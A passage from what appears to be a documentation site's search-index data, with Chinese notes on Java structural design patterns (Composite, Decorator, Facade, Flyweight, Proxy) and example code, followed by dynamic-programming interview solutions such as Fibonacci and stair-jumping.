\u7EC4\u5408\u5BF9\u8C61\u62E5\u6709\u4E00\u4E2A\u6216\u8005\u591A\u4E2A\u7EC4\u4EF6\u5BF9\u8C61\uFF0C\u56E0\u6B64\u7EC4\u5408\u5BF9\u8C61\u7684\u64CD\u4F5C\u53EF\u4EE5\u59D4\u6258\u7ED9\u7EC4\u4EF6\u5BF9\u8C61\u53BB\u5904\u7406\uFF0C\u800C\u7EC4\u4EF6\u5BF9\u8C61\u53EF\u4EE5\u662F\u53E6\u4E00\u4E2A\u7EC4\u5408\u5BF9\u8C61\u6216\u8005\u53F6\u5B50\u5BF9\u8C61\u3002`},{header:"Implementation",slug:"implementation-20",content:`public abstract class Component { protected String name; public Component(String name) { this.name = name; } public void print() { print(0); } abstract void print(int level); abstract public void add(Component component); abstract public void remove(Component component);
}
public class Composite extends Component { private List<Component> child; public Composite(String name) { super(name); child = new ArrayList<>(); } @Override void print(int level) { for (int i = 0; i < level; i++) { System.out.print("--"); } System.out.println("Composite:" + name); for (Component component : child) { component.print(level + 1); } } @Override public void add(Component component) { child.add(component); } @Override public void remove(Component component) { child.remove(component); }
}
public class Leaf extends Component { public Leaf(String name) { super(name); } @Override void print(int level) { for (int i = 0; i < level; i++) { System.out.print("--"); } System.out.println("left:" + name); } @Override public void add(Component component) { throw new UnsupportedOperationException(); // \u727A\u7272\u900F\u660E\u6027\u6362\u53D6\u5355\u4E00\u804C\u8D23\u539F\u5219\uFF0C\u8FD9\u6837\u5C31\u4E0D\u7528\u8003\u8651\u662F\u53F6\u5B50\u8282\u70B9\u8FD8\u662F\u7EC4\u5408\u8282\u70B9 } @Override public void remove(Component component) { throw new UnsupportedOperationException(); }
}
public class Client { public static void main(String[] args) { Composite root = new Composite("root"); Component node1 = new Leaf("1"); Component node2 = new Composite("2"); Component node3 = new Leaf("3"); root.add(node1); root.add(node2); root.add(node3); Component node21 = new Leaf("21"); Component node22 = new Composite("22"); node2.add(node21); node2.add(node22); Component node221 = new Leaf("221"); node22.add(node221); root.print(); }
}
Composite:root
--left:1
--Composite:2
----left:21
----Composite:22
------left:221
--left:3`},{header:"JDK",slug:"jdk-17",content:`javax.swing.JComponent#add(Component)
java.awt.Container#add(Component)
java.util.Map#putAll(Map)
java.util.List#addAll(Collection)
java.util.Set#addAll(Collection)`},{header:"4. \u88C5\u9970\uFF08Decorator\uFF09",slug:"_4-\u88C5\u9970-decorator",content:""},{header:"Intent",slug:"intent-21",content:"\u4E3A\u5BF9\u8C61\u52A8\u6001\u6DFB\u52A0\u529F\u80FD\u3002"},{header:"Class Diagram",slug:"class-diagram-21",content:"\u88C5\u9970\u8005\uFF08Decorator\uFF09\u548C\u5177\u4F53\u7EC4\u4EF6\uFF08ConcreteComponent\uFF09\u90FD\u7EE7\u627F\u81EA\u7EC4\u4EF6\uFF08Component\uFF09\uFF0C\u5177\u4F53\u7EC4\u4EF6\u7684\u65B9\u6CD5\u5B9E\u73B0\u4E0D\u9700\u8981\u4F9D\u8D56\u4E8E\u5176\u5B83\u5BF9\u8C61\uFF0C\u800C\u88C5\u9970\u8005\u7EC4\u5408\u4E86\u4E00\u4E2A\u7EC4\u4EF6\uFF0C\u8FD9\u6837\u5B83\u53EF\u4EE5\u88C5\u9970\u5176\u5B83\u88C5\u9970\u8005\u6216\u8005\u5177\u4F53\u7EC4\u4EF6\u3002\u6240\u8C13\u88C5\u9970\uFF0C\u5C31\u662F\u628A\u8FD9\u4E2A\u88C5\u9970\u8005\u5957\u5728\u88AB\u88C5\u9970\u8005\u4E4B\u4E0A\uFF0C\u4ECE\u800C\u52A8\u6001\u6269\u5C55\u88AB\u88C5\u9970\u8005\u7684\u529F\u80FD\u3002\u88C5\u9970\u8005\u7684\u65B9\u6CD5\u6709\u4E00\u90E8\u5206\u662F\u81EA\u5DF1\u7684\uFF0C\u8FD9\u5C5E\u4E8E\u5B83\u7684\u529F\u80FD\uFF0C\u7136\u540E\u8C03\u7528\u88AB\u88C5\u9970\u8005\u7684\u65B9\u6CD5\u5B9E\u73B0\uFF0C\u4ECE\u800C\u4E5F\u4FDD\u7559\u4E86\u88AB\u88C5\u9970\u8005\u7684\u529F\u80FD\u3002\u53EF\u4EE5\u770B\u5230\uFF0C\u5177\u4F53\u7EC4\u4EF6\u5E94\u5F53\u662F\u88C5\u9970\u5C42\u6B21\u7684\u6700\u4F4E\u5C42\uFF0C\u56E0\u4E3A\u53EA\u6709\u5177\u4F53\u7EC4\u4EF6\u7684\u65B9\u6CD5\u5B9E\u73B0\u4E0D\u9700\u8981\u4F9D\u8D56\u4E8E\u5176\u5B83\u5BF9\u8C61\u3002"},{header:"Implementation",slug:"implementation-21",content:`\u8BBE\u8BA1\u4E0D\u540C\u79CD\u7C7B\u7684\u996E\u6599\uFF0C\u996E\u6599\u53EF\u4EE5\u6DFB\u52A0\u914D\u6599\uFF0C\u6BD4\u5982\u53EF\u4EE5\u6DFB\u52A0\u725B\u5976\uFF0C\u5E76\u4E14\u652F\u6301\u52A8\u6001\u6DFB\u52A0\u65B0\u914D\u6599\u3002\u6BCF\u589E\u52A0\u4E00\u79CD\u914D\u6599\uFF0C\u8BE5\u996E\u6599\u7684\u4EF7\u683C\u5C31\u4F1A\u589E\u52A0\uFF0C\u8981\u6C42\u8BA1\u7B97\u4E00\u79CD\u996E\u6599\u7684\u4EF7\u683C\u3002
\u4E0B\u56FE\u8868\u793A\u5728 DarkRoast \u996E\u6599\u4E0A\u65B0\u589E\u65B0\u6DFB\u52A0 Mocha \u914D\u6599\uFF0C\u4E4B\u540E\u53C8\u6DFB\u52A0\u4E86 Whip \u914D\u6599\u3002DarkRoast \u88AB Mocha \u5305\u88F9\uFF0CMocha \u53C8\u88AB Whip \u5305\u88F9\u3002\u5B83\u4EEC\u90FD\u7EE7\u627F\u81EA\u76F8\u540C\u7236\u7C7B\uFF0C\u90FD\u6709 cost() \u65B9\u6CD5\uFF0C\u5916\u5C42\u7C7B\u7684 cost() \u65B9\u6CD5\u8C03\u7528\u4E86\u5185\u5C42\u7C7B\u7684 cost() \u65B9\u6CD5\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/c9cfd600-bc91-4f3a-9f99-b42f88a5bb24.jpg" width="600)
public interface Beverage { double cost();
}
public class DarkRoast implements Beverage { @Override public double cost() { return 1; }
}
public class HouseBlend implements Beverage { @Override public double cost() { return 1; }
}
public abstract class CondimentDecorator implements Beverage { protected Beverage beverage;
}
public class Milk extends CondimentDecorator { public Milk(Beverage beverage) { this.beverage = beverage; } @Override public double cost() { return 1 + beverage.cost(); }
}
public class Mocha extends CondimentDecorator { public Mocha(Beverage beverage) { this.beverage = beverage; } @Override public double cost() { return 1 + beverage.cost(); }
}
public class Client { public static void main(String[] args) { Beverage beverage = new HouseBlend(); beverage = new Mocha(beverage); beverage = new Milk(beverage); System.out.println(beverage.cost()); }
}
3.0`},{header:"\u8BBE\u8BA1\u539F\u5219",slug:"\u8BBE\u8BA1\u539F\u5219",content:`\u7C7B\u5E94\u8BE5\u5BF9\u6269\u5C55\u5F00\u653E\uFF0C\u5BF9\u4FEE\u6539\u5173\u95ED\uFF1A\u4E5F\u5C31\u662F\u6DFB\u52A0\u65B0\u529F\u80FD\u65F6\u4E0D\u9700\u8981\u4FEE\u6539\u4EE3\u7801\u3002\u996E\u6599\u53EF\u4EE5\u52A8\u6001\u6DFB\u52A0\u65B0\u7684\u914D\u6599\uFF0C\u800C\u4E0D\u9700\u8981\u53BB\u4FEE\u6539\u996E\u6599\u7684\u4EE3\u7801\u3002
\u4E0D\u53EF\u80FD\u628A\u6240\u6709\u7684\u7C7B\u8BBE\u8BA1\u6210\u90FD\u6EE1\u8DB3\u8FD9\u4E00\u539F\u5219\uFF0C\u5E94\u5F53\u628A\u8BE5\u539F\u5219\u5E94\u7528\u4E8E\u6700\u6709\u53EF\u80FD\u53D1\u751F\u6539\u53D8\u7684\u5730\u65B9\u3002`},{header:"JDK",slug:"jdk-18",content:`java.io.BufferedInputStream(InputStream)
java.io.DataInputStream(InputStream)
java.io.BufferedOutputStream(OutputStream)
java.util.zip.ZipOutputStream(OutputStream)
java.util.Collections`},{header:"5. \u5916\u89C2\uFF08Facade\uFF09",slug:"_5-\u5916\u89C2-facade",content:""},{header:"Intent",slug:"intent-22",content:"\u63D0\u4F9B\u4E86\u4E00\u4E2A\u7EDF\u4E00\u7684\u63A5\u53E3\uFF0C\u7528\u6765\u8BBF\u95EE\u5B50\u7CFB\u7EDF\u4E2D\u7684\u4E00\u7FA4\u63A5\u53E3\uFF0C\u4ECE\u800C\u8BA9\u5B50\u7CFB\u7EDF\u66F4\u5BB9\u6613\u4F7F\u7528\u3002"},{header:"Class Diagram",slug:"class-diagram-22",content:""},{header:"Implementation",slug:"implementation-22",content:`\u89C2\u770B\u7535\u5F71\u9700\u8981\u64CD\u4F5C\u5F88\u591A\u7535\u5668\uFF0C\u4F7F\u7528\u5916\u89C2\u6A21\u5F0F\u5B9E\u73B0\u4E00\u952E\u770B\u7535\u5F71\u529F\u80FD\u3002
public class SubSystem { public void turnOnTV() { System.out.println("turnOnTV()"); } public void setCD(String cd) { System.out.println("setCD( " + cd + " )"); } public void startWatching(){ System.out.println("startWatching()"); }
}
public class Facade { private SubSystem subSystem = new SubSystem(); public void watchMovie() { subSystem.turnOnTV(); subSystem.setCD("a movie"); subSystem.startWatching(); }
}
public class Client { public static void main(String[] args) { Facade facade = new Facade(); facade.watchMovie(); }
}`},{header:"\u8BBE\u8BA1\u539F\u5219",slug:"\u8BBE\u8BA1\u539F\u5219-1",content:"\u6700\u5C11\u77E5\u8BC6\u539F\u5219\uFF1A\u53EA\u548C\u4F60\u7684\u5BC6\u53CB\u8C08\u8BDD\u3002\u4E5F\u5C31\u662F\u8BF4\u5BA2\u6237\u5BF9\u8C61\u6240\u9700\u8981\u4EA4\u4E92\u7684\u5BF9\u8C61\u5E94\u5F53\u5C3D\u53EF\u80FD\u5C11\u3002"},{header:"6. \u4EAB\u5143\uFF08Flyweight\uFF09",slug:"_6-\u4EAB\u5143-flyweight",content:""},{header:"Intent",slug:"intent-23",content:"\u5229\u7528\u5171\u4EAB\u7684\u65B9\u5F0F\u6765\u652F\u6301\u5927\u91CF\u7EC6\u7C92\u5EA6\u7684\u5BF9\u8C61\uFF0C\u8FD9\u4E9B\u5BF9\u8C61\u4E00\u90E8\u5206\u5185\u90E8\u72B6\u6001\u662F\u76F8\u540C\u7684\u3002"},{header:"Class Diagram",slug:"class-diagram-23",content:`Flyweight\uFF1A\u4EAB\u5143\u5BF9\u8C61
IntrinsicState\uFF1A\u5185\u90E8\u72B6\u6001\uFF0C\u4EAB\u5143\u5BF9\u8C61\u5171\u4EAB\u5185\u90E8\u72B6\u6001
ExtrinsicState\uFF1A\u5916\u90E8\u72B6\u6001\uFF0C\u6BCF\u4E2A\u4EAB\u5143\u5BF9\u8C61\u7684\u5916\u90E8\u72B6\u6001\u4E0D\u540C`},{header:"Implementation",slug:"implementation-23",content:`public interface Flyweight { void doOperation(String extrinsicState);
}
public class ConcreteFlyweight implements Flyweight { private String intrinsicState; public ConcreteFlyweight(String intrinsicState) { this.intrinsicState = intrinsicState; } @Override public void doOperation(String extrinsicState) { System.out.println("Object address: " + System.identityHashCode(this)); System.out.println("IntrinsicState: " + intrinsicState); System.out.println("ExtrinsicState: " + extrinsicState); }
}
public class FlyweightFactory { private HashMap<String, Flyweight> flyweights = new HashMap<>(); Flyweight getFlyweight(String intrinsicState) { if (!flyweights.containsKey(intrinsicState)) { Flyweight flyweight = new ConcreteFlyweight(intrinsicState); flyweights.put(intrinsicState, flyweight); } return flyweights.get(intrinsicState); }
}
public class Client { public static void main(String[] args) { FlyweightFactory factory = new FlyweightFactory(); Flyweight flyweight1 = factory.getFlyweight("aa"); Flyweight flyweight2 = factory.getFlyweight("aa"); flyweight1.doOperation("x"); flyweight2.doOperation("y"); }
}
Object address: 1163157884
IntrinsicState: aa
ExtrinsicState: x
Object address: 1163157884
IntrinsicState: aa
ExtrinsicState: y`},{header:"JDK",slug:"jdk-19",content:`Java \u5229\u7528\u7F13\u5B58\u6765\u52A0\u901F\u5927\u91CF\u5C0F\u5BF9\u8C61\u7684\u8BBF\u95EE\u65F6\u95F4\u3002 java.lang.Integer#valueOf(int)
java.lang.Boolean#valueOf(boolean)
java.lang.Byte#valueOf(byte)
java.lang.Character#valueOf(char)`},{header:"7. \u4EE3\u7406\uFF08Proxy\uFF09",slug:"_7-\u4EE3\u7406-proxy",content:""},{header:"Intent",slug:"intent-24",content:"\u63A7\u5236\u5BF9\u5176\u5B83\u5BF9\u8C61\u7684\u8BBF\u95EE\u3002"},{header:"Class Diagram",slug:"class-diagram-24",content:`\u4EE3\u7406\u6709\u4EE5\u4E0B\u56DB\u7C7B\uFF1A \u8FDC\u7A0B\u4EE3\u7406\uFF08Remote Proxy\uFF09\uFF1A\u63A7\u5236\u5BF9\u8FDC\u7A0B\u5BF9\u8C61\uFF08\u4E0D\u540C\u5730\u5740\u7A7A\u95F4\uFF09\u7684\u8BBF\u95EE\uFF0C\u5B83\u8D1F\u8D23\u5C06\u8BF7\u6C42\u53CA\u5176\u53C2\u6570\u8FDB\u884C\u7F16\u7801\uFF0C\u5E76\u5411\u4E0D\u540C\u5730\u5740\u7A7A\u95F4\u4E2D\u7684\u5BF9\u8C61\u53D1\u9001\u5DF2\u7ECF\u7F16\u7801\u7684\u8BF7\u6C42\u3002
\u865A\u62DF\u4EE3\u7406\uFF08Virtual Proxy\uFF09\uFF1A\u6839\u636E\u9700\u8981\u521B\u5EFA\u5F00\u9500\u5F88\u5927\u7684\u5BF9\u8C61\uFF0C\u5B83\u53EF\u4EE5\u7F13\u5B58\u5B9E\u4F53\u7684\u9644\u52A0\u4FE1\u606F\uFF0C\u4EE5\u4FBF\u5EF6\u8FDF\u5BF9\u5B83\u7684\u8BBF\u95EE\uFF0C\u4F8B\u5982\u5728\u7F51\u7AD9\u52A0\u8F7D\u4E00\u4E2A\u5F88\u5927\u56FE\u7247\u65F6\uFF0C\u4E0D\u80FD\u9A6C\u4E0A\u5B8C\u6210\uFF0C\u53EF\u4EE5\u7528\u865A\u62DF\u4EE3\u7406\u7F13\u5B58\u56FE\u7247\u7684\u5927\u5C0F\u4FE1\u606F\uFF0C\u7136\u540E\u751F\u6210\u4E00\u5F20\u4E34\u65F6\u56FE\u7247\u4EE3\u66FF\u539F\u59CB\u56FE\u7247\u3002
\u4FDD\u62A4\u4EE3\u7406\uFF08Protection Proxy\uFF09\uFF1A\u6309\u6743\u9650\u63A7\u5236\u5BF9\u8C61\u7684\u8BBF\u95EE\uFF0C\u5B83\u8D1F\u8D23\u68C0\u67E5\u8C03\u7528\u8005\u662F\u5426\u5177\u6709\u5B9E\u73B0\u4E00\u4E2A\u8BF7\u6C42\u6240\u5FC5\u987B\u7684\u8BBF\u95EE\u6743\u9650\u3002
\u667A\u80FD\u4EE3\u7406\uFF08Smart Reference\uFF09\uFF1A\u53D6\u4EE3\u4E86\u7B80\u5355\u7684\u6307\u9488\uFF0C\u5B83\u5728\u8BBF\u95EE\u5BF9\u8C61\u65F6\u6267\u884C\u4E00\u4E9B\u9644\u52A0\u64CD\u4F5C\uFF1A\u8BB0\u5F55\u5BF9\u8C61\u7684\u5F15\u7528\u6B21\u6570\uFF1B\u5F53\u7B2C\u4E00\u6B21\u5F15\u7528\u4E00\u4E2A\u5BF9\u8C61\u65F6\uFF0C\u5C06\u5B83\u88C5\u5165\u5185\u5B58\uFF1B\u5728\u8BBF\u95EE\u4E00\u4E2A\u5B9E\u9645\u5BF9\u8C61\u524D\uFF0C\u68C0\u67E5\u662F\u5426\u5DF2\u7ECF\u9501\u5B9A\u4E86\u5B83\uFF0C\u4EE5\u786E\u4FDD\u5176\u5B83\u5BF9\u8C61\u4E0D\u80FD\u6539\u53D8\u5B83\u3002`},{header:"Implementation",slug:"implementation-24",content:`\u4EE5\u4E0B\u662F\u4E00\u4E2A\u865A\u62DF\u4EE3\u7406\u7684\u5B9E\u73B0\uFF0C\u6A21\u62DF\u4E86\u56FE\u7247\u5EF6\u8FDF\u52A0\u8F7D\u7684\u60C5\u51B5\u4E0B\u4F7F\u7528\u4E0E\u56FE\u7247\u5927\u5C0F\u76F8\u7B49\u7684\u4E34\u65F6\u5185\u5BB9\u53BB\u66FF\u6362\u539F\u59CB\u56FE\u7247\uFF0C\u76F4\u5230\u56FE\u7247\u52A0\u8F7D\u5B8C\u6210\u624D\u5C06\u56FE\u7247\u663E\u793A\u51FA\u6765\u3002
public interface Image { void showImage();
}
public class HighResolutionImage implements Image { private URL imageURL; private long startTime; private int height; private int width; public int getHeight() { return height; } public int getWidth() { return width; } public HighResolutionImage(URL imageURL) { this.imageURL = imageURL; this.startTime = System.currentTimeMillis(); this.width = 600; this.height = 600; } public boolean isLoad() { // \u6A21\u62DF\u56FE\u7247\u52A0\u8F7D\uFF0C\u5EF6\u8FDF 3s \u52A0\u8F7D\u5B8C\u6210 long endTime = System.currentTimeMillis(); return endTime - startTime > 3000; } @Override public void showImage() { System.out.println("Real Image: " + imageURL); }
}
public class ImageProxy implements Image { private HighResolutionImage highResolutionImage; public ImageProxy(HighResolutionImage highResolutionImage) { this.highResolutionImage = highResolutionImage; } @Override public void showImage() { while (!highResolutionImage.isLoad()) { try { System.out.println("Temp Image: " + highResolutionImage.getWidth() + " " + highResolutionImage.getHeight()); Thread.sleep(100); } catch (InterruptedException e) { e.printStackTrace(); } } highResolutionImage.showImage(); }
}
public class ImageViewer { public static void main(String[] args) throws Exception { String image = "http://image.jpg"; URL url = new URL(image); HighResolutionImage highResolutionImage = new HighResolutionImage(url); ImageProxy imageProxy = new ImageProxy(highResolutionImage); imageProxy.showImage(); }
}`},{header:"JDK",slug:"jdk-20",content:`java.lang.reflect.Proxy
RMI`},{header:"\u53C2\u8003\u8D44\u6599",slug:"\u53C2\u8003\u8D44\u6599",content:`\u5F17\u91CC\u66FC. Head First \u8BBE\u8BA1\u6A21\u5F0F [M]. \u4E2D\u56FD\u7535\u529B\u51FA\u7248\u793E, 2007.
Gamma E. \u8BBE\u8BA1\u6A21\u5F0F: \u53EF\u590D\u7528\u9762\u5411\u5BF9\u8C61\u8F6F\u4EF6\u7684\u57FA\u7840 [M]. \u673A\u68B0\u5DE5\u4E1A\u51FA\u7248\u793E, 2007.
Bloch J. Effective java[M]. Addison-Wesley Professional, 2017.
Design Patterns
Design patterns implemented in Java
The breakdown of design patterns in JDK`}]},{path:"/%E9%A2%98%E8%A7%A3/10.1%20%E6%96%90%E6%B3%A2%E9%82%A3%E5%A5%91%E6%95%B0%E5%88%97.html",title:"10.1 \u6590\u6CE2\u90A3\u5951\u6570\u5217",pathLocale:"/",contents:[{header:"10.1 \u6590\u6CE2\u90A3\u5951\u6570\u5217",slug:"_10-1-\u6590\u6CE2\u90A3\u5951\u6570\u5217",content:""},{header:"\u9898\u76EE\u94FE\u63A5",slug:"\u9898\u76EE\u94FE\u63A5",content:"\u725B\u5BA2\u7F51"},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0",content:'\u6C42\u6590\u6CE2\u90A3\u5951\u6570\u5217\u7684\u7B2C n \u9879\uFF0Cn <= 39\u3002 ![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/45be9587-6069-4ab7-b9ac-840db1a53744.jpg" width="330px">'},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:`\u5982\u679C\u4F7F\u7528\u9012\u5F52\u6C42\u89E3\uFF0C\u4F1A\u91CD\u590D\u8BA1\u7B97\u4E00\u4E9B\u5B50\u95EE\u9898\u3002\u4F8B\u5982\uFF0C\u8BA1\u7B97 f(4) \u9700\u8981\u8BA1\u7B97 f(3) \u548C f(2)\uFF0C\u8BA1\u7B97 f(3) \u9700\u8981\u8BA1\u7B97 f(2) \u548C f(1)\uFF0C\u53EF\u4EE5\u770B\u5230 f(2) \u88AB\u91CD\u590D\u8BA1\u7B97\u4E86\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/c13e2a3d-b01c-4a08-a69b-db2c4e821e09.png" width="350px)
\u9012\u5F52\u662F\u5C06\u4E00\u4E2A\u95EE\u9898\u5212\u5206\u6210\u591A\u4E2A\u5B50\u95EE\u9898\u6C42\u89E3\uFF0C\u52A8\u6001\u89C4\u5212\u4E5F\u662F\u5982\u6B64\uFF0C\u4F46\u662F\u52A8\u6001\u89C4\u5212\u4F1A\u628A\u5B50\u95EE\u9898\u7684\u89E3\u7F13\u5B58\u8D77\u6765\uFF0C\u4ECE\u800C\u907F\u514D\u91CD\u590D\u6C42\u89E3\u5B50\u95EE\u9898\u3002
public int Fibonacci(int n) { if (n <= 1) return n; int[] fib = new int[n + 1]; fib[1] = 1; for (int i = 2; i <= n; i++) fib[i] = fib[i - 1] + fib[i - 2]; return fib[n];
}
\u8003\u8651\u5230\u7B2C i \u9879\u53EA\u4E0E\u7B2C i-1 \u548C\u7B2C i-2 \u9879\u6709\u5173\uFF0C\u56E0\u6B64\u53EA\u9700\u8981\u5B58\u50A8\u524D\u4E24\u9879\u7684\u503C\u5C31\u80FD\u6C42\u89E3\u7B2C i \u9879\uFF0C\u4ECE\u800C\u5C06\u7A7A\u95F4\u590D\u6742\u5EA6\u7531 O(N) \u964D\u4F4E\u4E3A O(1)\u3002
public int Fibonacci(int n) { if (n <= 1) return n; int pre2 = 0, pre1 = 1; int fib = 0; for (int i = 2; i <= n; i++) { fib = pre2 + pre1; pre2 = pre1; pre1 = fib; } return fib;
}
\u7531\u4E8E\u5F85\u6C42\u89E3\u7684 n \u5C0F\u4E8E 40\uFF0C\u56E0\u6B64\u53EF\u4EE5\u5C06\u524D 40 \u9879\u7684\u7ED3\u679C\u5148\u8FDB\u884C\u8BA1\u7B97\uFF0C\u4E4B\u540E\u5C31\u80FD\u4EE5 O(1) \u65F6\u95F4\u590D\u6742\u5EA6\u5F97\u5230\u7B2C n \u9879\u7684\u503C\u3002
public class Solution { private int[] fib = new int[40]; public Solution() { fib[1] = 1; for (int i = 2; i < fib.length; i++) fib[i] = fib[i - 1] + fib[i - 2]; } public int Fibonacci(int n) { return fib[n]; }
}`}]},{path:"/%E9%A2%98%E8%A7%A3/10.2%20%E7%9F%A9%E5%BD%A2%E8%A6%86%E7%9B%96.html",title:"10.2 \u77E9\u5F62\u8986\u76D6",pathLocale:"/",contents:[{header:"10.2 \u77E9\u5F62\u8986\u76D6",slug:"_10-2-\u77E9\u5F62\u8986\u76D6",content:""},{header:"\u9898\u76EE\u94FE\u63A5",slug:"\u9898\u76EE\u94FE\u63A5",content:"\u725B\u5BA2\u7F51"},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0",content:`\u6211\u4EEC\u53EF\u4EE5\u7528 2*1 \u7684\u5C0F\u77E9\u5F62\u6A2A\u7740\u6216\u8005\u7AD6\u7740\u53BB\u8986\u76D6\u66F4\u5927\u7684\u77E9\u5F62\u3002\u8BF7\u95EE\u7528 n \u4E2A 2*1 \u7684\u5C0F\u77E9\u5F62\u65E0\u91CD\u53E0\u5730\u8986\u76D6\u4E00\u4E2A 2*n \u7684\u5927\u77E9\u5F62\uFF0C\u603B\u5171\u6709\u591A\u5C11\u79CD\u65B9\u6CD5\uFF1F
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/b903fda8-07d0-46a7-91a7-e803892895cf.gif" width="100px">`},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:`\u5F53 n \u4E3A 1 \u65F6\uFF0C\u53EA\u6709\u4E00\u79CD\u8986\u76D6\u65B9\u6CD5\uFF1A
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/f6e146f1-57ad-411b-beb3-770a142164ef.png" width="100px">
\u5F53 n \u4E3A 2 \u65F6\uFF0C\u6709\u4E24\u79CD\u8986\u76D6\u65B9\u6CD5\uFF1A
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/fb3b8f7a-4293-4a38-aae1-62284db979a3.png" width="200px">
\u8981\u8986\u76D6 2*n \u7684\u5927\u77E9\u5F62\uFF0C\u53EF\u4EE5\u5148\u8986\u76D6 2*1 \u7684\u77E9\u5F62\uFF0C\u518D\u8986\u76D6 2*(n-1) \u7684\u77E9\u5F62\uFF1B\u6216\u8005\u5148\u8986\u76D6 2*2 \u7684\u77E9\u5F62\uFF0C\u518D\u8986\u76D6 2*(n-2) \u7684\u77E9\u5F62\u3002\u800C\u8986\u76D6 2*(n-1) \u548C 2*(n-2) \u7684\u77E9\u5F62\u53EF\u4EE5\u770B\u6210\u5B50\u95EE\u9898\u3002\u8BE5\u95EE\u9898\u7684\u9012\u63A8\u516C\u5F0F\u5982\u4E0B\uFF1A ![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/508c6e52-9f93-44ed-b6b9-e69050e14807.jpg" width="370px">
public int rectCover(int n) { if (n <= 2) return n; int pre2 = 1, pre1 = 2; int result = 0; for (int i = 3; i <= n; i++) { result = pre2 + pre1; pre2 = pre1; pre1 = result; } return result;
}`}]},{path:"/%E9%A2%98%E8%A7%A3/10.3%20%E8%B7%B3%E5%8F%B0%E9%98%B6.html",title:"10.3 \u8DF3\u53F0\u9636",pathLocale:"/",contents:[{header:"10.3 \u8DF3\u53F0\u9636",slug:"_10-3-\u8DF3\u53F0\u9636",content:""},{header:"\u9898\u76EE\u94FE\u63A5",slug:"\u9898\u76EE\u94FE\u63A5",content:"\u725B\u5BA2\u7F51"},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0",content:`\u4E00\u53EA\u9752\u86D9\u4E00\u6B21\u53EF\u4EE5\u8DF3\u4E0A 1 \u7EA7\u53F0\u9636\uFF0C\u4E5F\u53EF\u4EE5\u8DF3\u4E0A 2 \u7EA7\u3002\u6C42\u8BE5\u9752\u86D9\u8DF3\u4E0A\u4E00\u4E2A n \u7EA7\u7684\u53F0\u9636\u603B\u5171\u6709\u591A\u5C11\u79CD\u8DF3\u6CD5\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/9dae7475-934f-42e5-b3b3-12724337170a.png" width="380px">`},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:`\u5F53 n = 1 \u65F6\uFF0C\u53EA\u6709\u4E00\u79CD\u8DF3\u6CD5\uFF1A
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/72aac98a-d5df-4bfa-a71a-4bb16a87474c.png" width="250px">
\u5F53 n = 2 \u65F6\uFF0C\u6709\u4E24\u79CD\u8DF3\u6CD5\uFF1A
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/1b80288d-1b35-4cd3-aa17-7e27ab9a2389.png" width="300px">
\u8DF3 n \u9636\u53F0\u9636\uFF0C\u53EF\u4EE5\u5148\u8DF3 1 \u9636\u53F0\u9636\uFF0C\u518D\u8DF3 n-1 \u9636\u53F0\u9636\uFF1B\u6216\u8005\u5148\u8DF3 2 \u9636\u53F0\u9636\uFF0C\u518D\u8DF3 n-2 \u9636\u53F0\u9636\u3002\u800C n-1 \u548C n-2 \u9636\u53F0\u9636\u7684\u8DF3\u6CD5\u53EF\u4EE5\u770B\u6210\u5B50\u95EE\u9898\uFF0C\u8BE5\u95EE\u9898\u7684\u9012\u63A8\u516C\u5F0F\u4E3A\uFF1A
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/508c6e52-9f93-44ed-b6b9-e69050e14807.jpg" width="350px">
public int JumpFloor(int n) { if (n <= 2) return n; int pre2 = 1, pre1 = 2; int result = 0; for (int i = 2; i < n; i++) { result = pre2 + pre1; pre2 = pre1; pre1 = result; } return result;
}`}]},{path:"/%E9%A2%98%E8%A7%A3/10.4%20%E5%8F%98%E6%80%81%E8%B7%B3%E5%8F%B0%E9%98%B6.html",title:"10.4 \u53D8\u6001\u8DF3\u53F0\u9636",pathLocale:"/",contents:[{header:"10.4 \u53D8\u6001\u8DF3\u53F0\u9636",slug:"_10-4-\u53D8\u6001\u8DF3\u53F0\u9636",content:""},{header:"\u9898\u76EE\u94FE\u63A5",slug:"\u9898\u76EE\u94FE\u63A5",content:"\u725B\u5BA2\u7F51"},{header:"\u9898\u76EE\u63CF\u8FF0",slug:"\u9898\u76EE\u63CF\u8FF0",content:`\u4E00\u53EA\u9752\u86D9\u4E00\u6B21\u53EF\u4EE5\u8DF3\u4E0A 1 \u7EA7\u53F0\u9636\uFF0C\u4E5F\u53EF\u4EE5\u8DF3\u4E0A 2 \u7EA7... \u5B83\u4E5F\u53EF\u4EE5\u8DF3\u4E0A n \u7EA7\u3002\u6C42\u8BE5\u9752\u86D9\u8DF3\u4E0A\u4E00\u4E2A n \u7EA7\u7684\u53F0\u9636\u603B\u5171\u6709\u591A\u5C11\u79CD\u8DF3\u6CD5\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/cd411a94-3786-4c94-9e08-f28320e010d5.png" width="380px">`},{header:"\u89E3\u9898\u601D\u8DEF",slug:"\u89E3\u9898\u601D\u8DEF",content:""},{header:"\u52A8\u6001\u89C4\u5212",slug:"\u52A8\u6001\u89C4\u5212",content:`public int jumpFloorII(int target) { int[] dp = new int[target]; Arrays.fill(dp, 1); for (int i = 1; i < target; i++) for (int j = 0; j < i; j++) dp[i] += dp[j]; return dp[target - 1];
